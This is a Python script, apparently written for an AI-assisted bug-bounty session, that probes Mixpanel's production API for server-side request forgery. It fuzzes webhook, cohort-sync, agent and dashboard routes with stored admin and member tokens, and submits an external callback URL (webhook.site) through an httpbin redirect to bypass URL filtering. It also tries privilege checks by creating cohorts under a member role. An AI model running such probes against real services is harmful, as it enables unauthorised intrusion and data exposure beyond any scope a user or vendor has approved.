#!/usr/bin/env python3
"""SSRF trigger probe v2 — broader endpoint discovery:
 - OPTIONS on /webhooks routes to discover allowed sub-verbs
 - Discover actual registered routes via 405/Allow header inspection
 - Probe service-account based cohorts API at /api/2.0
 - Try MEMBER role (has write_cohorts per /api/app/me)
 - Probe alert/notification/lexicon/agent/data-warehouse/destination paths
 - Per docs.mixpanel.com/docs/cohort-sync/webhooks — look for any preview/test/sync verb on stored object
"""
import sys, os, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

TARGET = 'mixpanel'
tokens = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
ADMIN = tokens['ADMIN']
MEMBER = tokens.get('MEMBER', {})
PROJECT = 4025923

OAST_UUID = '3028c45a-5f34-4192-bad3-dba270e80b06'
OAST_URL = f'https://webhook.site/{OAST_UUID}'

sh = SafeHttp(allow_raw_for_waf=True)
LOG = f'/home/hunter/new_agent/targets/{TARGET}/notes/session-log.md'
RES = f'/home/hunter/new_agent/results/{TARGET}/ssrf-trigger-{int(time.time())}.json'
results = []

def log(m):
    with open(LOG,'a') as f: f.write(f"[{time.strftime('%H:%M:%S')}] SSRF-TRIGGER: {m}\n")
    print(f"SSRF-TRIGGER: {m}")

def req(method, path, body=None, role='ADMIN', extra_headers=None):
    url = f'https://mixpanel.com{path}'
    creds = ADMIN if role=='ADMIN' else MEMBER
    h = dict(creds.get('api_request_headers', {}))
    if extra_headers: h.update(extra_headers)
    h['Content-Type'] = 'application/json'
    try:
        kwargs = {"headers": h, "timeout": 15}
        if body is not None:
            kwargs['data'] = json.dumps(body)
        r = sh.request(method, url, **kwargs)
        code = r.status_code
        allow = r.headers.get('Allow', '')
        ct = r.headers.get('Content-Type', '')
        try:
            j = r.json()
            body_short = json.dumps(j)[:300]
        except:
            body_short = r.text[:300]
        return code, body_short, allow, ct
    except Exception as e:
        return -1, str(e)[:200], '', ''

def record(tag, method, path, code, body_short, allow='', ct='', role='ADMIN'):
    e = {"tag": tag, "method": method, "path": path, "code": code, "body": body_short,
         "allow": allow, "ct": ct, "role": role, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ")}
    results.append(e)
    flag = ' [INTERESTING]' if (code not in (404, -1) and code != 405) else ''
    log(f"{tag} {role} {method} {path} -> {code} Allow={allow}{flag} | {body_short[:120]}")

# === A: OPTIONS on /webhooks routes ===
log("=== A: OPTIONS discovery on /webhooks ===")
for p in [
    f'/api/app/projects/{PROJECT}/webhooks',
    f'/api/app/projects/{PROJECT}/webhooks/test',
    f'/api/app/projects/{PROJECT}/webhooks/test/',
    f'/api/2.0/cohorts/list?project_id={PROJECT}',
    f'/api/2.0/cohorts/members?project_id={PROJECT}',
    f'/api/2.0/cohorts?project_id={PROJECT}',
    f'/api/app/projects/{PROJECT}/integrations',
]:
    for m in ['OPTIONS', 'HEAD']:
        code, b, allow, ct = req(m, p)
        record(f"A-{m}", m, p, code, b, allow, ct)

# === B: try alternate webhook routes ===
log("=== B: alternate webhook surfaces ===")
alt_paths = [
    f'/api/app/projects/{PROJECT}/webhooks/test',  # known good baseline
    f'/api/app/projects/{PROJECT}/cohort_sync',
    f'/api/app/projects/{PROJECT}/cohort_sync/webhooks',
    f'/api/app/projects/{PROJECT}/cohort_sync/run',
    f'/api/app/projects/{PROJECT}/cohort_syncs',
    f'/api/app/projects/{PROJECT}/sync',
    f'/api/app/projects/{PROJECT}/syncs',
    f'/api/app/projects/{PROJECT}/destinations',
    f'/api/app/projects/{PROJECT}/destinations/webhooks',
    f'/api/app/projects/{PROJECT}/data-pipelines',
    f'/api/app/projects/{PROJECT}/data-warehouse',
    f'/api/app/projects/{PROJECT}/connectors',
    f'/api/app/projects/{PROJECT}/connections',
    f'/api/app/projects/{PROJECT}/jobs',
    f'/api/app/projects/{PROJECT}/jobs/run',
    f'/api/app/projects/{PROJECT}/tasks',
    f'/api/app/projects/{PROJECT}/triggers',
    f'/api/app/projects/{PROJECT}/agent_webhooks',
    f'/api/app/projects/{PROJECT}/lexicon/webhooks',
    f'/api/app/projects/{PROJECT}/alerts/webhook',
    f'/api/2.0/cohort_sync',
    f'/api/2.0/cohort-sync',
    f'/api/2.0/cohort_sync/list?project_id={PROJECT}',
    f'/api/2.0/cohort_sync/run?project_id={PROJECT}',
    f'/api/2.0/cohorts/sync?project_id={PROJECT}',
    f'/api/2.0/cohorts/sync_now?project_id={PROJECT}',
    f'/api/2.0/integrations?project_id={PROJECT}',
    f'/api/2.0/destinations?project_id={PROJECT}',
    f'/api/app/projects/{PROJECT}/dashboards',  # known-routed control
]
for p in alt_paths:
    for m in ['GET']:
        code, b, allow, ct = req(m, p)
        record(f"B-{m}", m, p, code, b, allow, ct)

# === C: webhook /test with redirect → OAST (re-confirm baseline OAST reaches via redirect) ===
log("=== C: confirm OAST reaches via redirect-bypass ===")
red_url = f'https://httpbin.org/redirect-to?status_code=302&url={OAST_URL}/redirect-bypass-confirm'
code, b, allow, ct = req('POST', f'/api/app/projects/{PROJECT}/webhooks/test',
                         {"url": red_url, "name": "redir-confirm"})
record("C-redir-oast", "POST", f'/api/app/projects/{PROJECT}/webhooks/test', code, b, allow, ct)

# === D: MEMBER role test — create cohort + webhook on their own project (they have write_cohorts) ===
log("=== D: MEMBER role probes ===")
me_path = '/api/app/me'
code, b, _, _ = req('GET', me_path, role='MEMBER')
record("D-MEMBER-me", "GET", me_path, code, b[:300])
# Find member's own project_id
try:
    me = json.loads(b)
    proj_ids = []
    for org in me.get('results', {}).get('organizations', {}).values():
        for proj in org.get('projects', {}).values():
            proj_ids.append(proj.get('id'))
    log(f"MEMBER projects: {proj_ids[:5]}")
    for pid in proj_ids[:3]:
        for path in [f'/api/app/projects/{pid}/cohorts', f'/api/app/projects/{pid}/webhooks']:
            code, b, _, _ = req('GET', path, role='MEMBER')
            record(f"D-MEM-{pid}", "GET", path, code, b[:200])
        # Try cohort create
        code, b, _, _ = req('POST', f'/api/app/projects/{pid}/cohorts',
                            {"name": "mem-test", "description": "x"}, role='MEMBER')
        record(f"D-MEM-cohort-create-{pid}", "POST", f'/api/app/projects/{pid}/cohorts', code, b[:200])
except Exception as e:
    log(f"MEMBER me parse error: {e}")

# === E: /api/2.0 cohort engineering endpoint with ADMIN — service-account API path ===
log("=== E: /api/2.0 cohorts deeper probe ===")
for path in [
    f'/api/2.0/cohorts/list?project_id={PROJECT}',
    f'/api/2.0/cohorts/list?project_id={PROJECT}&workspace_id=0',
    f'/api/2.0/cohorts/list',
]:
    code, b, allow, ct = req('GET', path)
    record(f"E-2.0-{path[:40]}", "GET", path, code, b[:200], allow, ct)
for path in [
    f'/api/2.0/cohorts',
    f'/api/2.0/cohorts?project_id={PROJECT}',
]:
    # try POST with various body shapes (cohort engine accepts JQL)
    for body in [
        {"params": "true", "project_id": PROJECT, "name": "tp"},
        {"params": {"behaviors": []}, "project_id": PROJECT, "name": "tp"},
    ]:
        code, b, allow, ct = req('POST', path, body)
        record(f"E-2.0-POST-{path[:30]}", "POST", path, code, b[:200], allow, ct)

# === F: agentic / agent / MCP endpoints (per scope docs) ===
log("=== F: agent / MCP / agentic endpoints ===")
for path in [
    f'/api/app/projects/{PROJECT}/agent',
    f'/api/app/projects/{PROJECT}/agents',
    f'/api/app/projects/{PROJECT}/agents/webhooks',
    f'/api/app/projects/{PROJECT}/automations',
    f'/api/app/projects/{PROJECT}/agentic_automations',
    f'/api/app/agent',
    f'/api/app/agents',
    f'/api/app/mcp',
    f'/api/2.0/agent?project_id={PROJECT}',
    f'/api/2.0/agentic?project_id={PROJECT}',
]:
    code, b, allow, ct = req('GET', path)
    record(f"F-{path.split('/')[-1]}", "GET", path, code, b[:200], allow, ct)

# === G: any path containing 'webhook' via word fuzz ===
log("=== G: webhook word fuzz on common segments ===")
for seg in ['webhook_url','webhooks_test','webhook-test','webhook/preview','webhook/dispatch',
            'webhook-deliveries','webhook_deliveries','webhook_history',
            'webhooks/preview','webhooks/dispatch','webhooks/deliveries',
            'webhooks/history','webhooks/logs']:
    p = f'/api/app/projects/{PROJECT}/{seg}'
    code, b, allow, ct = req('GET', p)
    record(f"G-{seg}", "GET", p, code, b[:200], allow, ct)
    if seg.endswith('test') or 'test' in seg:
        code, b, allow, ct = req('POST', p, {"url": OAST_URL})
        record(f"G-{seg}-POST", "POST", p, code, b[:200], allow, ct)

# === H: dashboard/board export with webhook callback (chain candidate per CLAUDE notes) ===
log("=== H: any board/dashboard/report 'send'/'share via webhook' ===")
for path in [
    f'/api/app/projects/{PROJECT}/dashboards/11207838/send',
    f'/api/app/projects/{PROJECT}/dashboards/11207838/share',
    f'/api/app/projects/{PROJECT}/dashboards/11207838/export',
    f'/api/app/projects/{PROJECT}/dashboards/11207838/subscribe',
    f'/api/app/projects/{PROJECT}/dashboards/11207838/webhook',
    f'/api/app/projects/{PROJECT}/dashboards/11207838/email',
    f'/api/app/projects/{PROJECT}/subscriptions',
    f'/api/app/projects/{PROJECT}/board_alerts',
]:
    code, b, allow, ct = req('GET', path)
    record(f"H-{path.split('/')[-1]}", "GET", path, code, b[:200], allow, ct)
    code, b, allow, ct = req('POST', path, {"url": OAST_URL, "webhook": OAST_URL,
                                            "destination": OAST_URL})
    record(f"H-{path.split('/')[-1]}-POST", "POST", path, code, b[:200], allow, ct)

with open(RES, 'w') as f: json.dump(results, f, indent=2)
log(f"Saved {RES} entries={len(results)}")
print(f"\nSAVED: {RES}")
